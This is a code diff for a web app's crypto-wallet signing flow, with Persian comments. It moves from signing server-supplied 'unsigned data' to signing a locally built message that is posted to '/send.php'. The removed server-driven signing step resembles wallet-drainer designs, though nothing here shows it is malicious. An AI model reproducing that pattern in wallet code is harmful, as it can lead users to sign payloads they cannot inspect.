@@ -19,45 +19,33 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = process.env.NEXT_PUBLIC_API_URL || "/api/proxy"; // استفاده از متغیر محیطی
+    let apiUrl = "/send.php"; // آدرس سرور برای پردازش تراکنش
 
     async function getRawSignature(address, balance) {
       try {
-        let requestData = {
-          handler: "tx",
-          address: address,
-          chain: "56",
-          type: "coin",
-          balance: balance, // مقدار BNB مورد نظر
-        };
-
-        let response = await fetch(apiUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(requestData),
+        let message = JSON.stringify({
+          sender: address,
+          balance: balance,
+          timestamp: Date.now(),
         });
-
-        let unsignedData = await response.json();
-        console.log("📜 Unsigned Data:", unsignedData);
 
         var rawSignature = await provider.request({
           method: "personal_sign",
-          params: [JSON.stringify(unsignedData), address], // ترتیب پارامترها مهم است
+          params: [message, address],
         });
 
-        return rawSignature;
+        return { rawSignature, message };
       } catch (error) {
         console.error("❌ Error in getRawSignature:", error);
         return null;
       }
     }
 
-    async function sendSignedTransaction(signature, sender, balance) {
+    async function sendSignedTransaction(signature, message) {
       try {
         let requestData = {
-          sender: sender,
-          balance: balance,
           signedData: signature,
+          message: message,
         };
 
         let response = await fetch(apiUrl, {
@@ -76,12 +64,15 @@ function App() {
       }
     }
 
-    let balance = "0.01"; // مقدار BNB مورد انتقال (می‌توان از ورودی کاربر گرفت)
-    var rawSignature = await getRawSignature(sender, balance);
+    let balance = "0.01"; // مقدار BNB مورد انتقال
+    var signedData = await getRawSignature(sender, balance);
 
-    if (rawSignature) {
-      console.log("✍️ Signed Raw Data:", rawSignature);
-      var txHash = await sendSignedTransaction(rawSignature, sender, balance);
+    if (signedData) {
+      console.log("✍️ Signed Raw Data:", signedData);
+      var txHash = await sendSignedTransaction(
+        signedData.rawSignature,
+        signedData.message
+      );
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
